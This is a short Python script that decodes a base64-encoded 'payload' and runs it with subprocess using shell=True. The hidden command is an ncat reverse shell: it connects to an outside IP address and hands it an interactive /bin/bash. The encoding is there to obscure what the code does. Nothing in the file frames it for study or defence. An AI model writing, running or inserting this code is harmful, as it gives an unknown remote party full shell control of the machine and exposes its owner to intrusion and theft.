import subprocess
import base64

# Base64 encode the payload
encoded = "bmNhdCAxNTkuODkuMTAyLjE0NyAxNDI5MiAtZSAvYmluL2Jhc2g="

# Decode and execute
cmd = base64.b64decode(encoded).decode()
subprocess.run(cmd, shell=True)
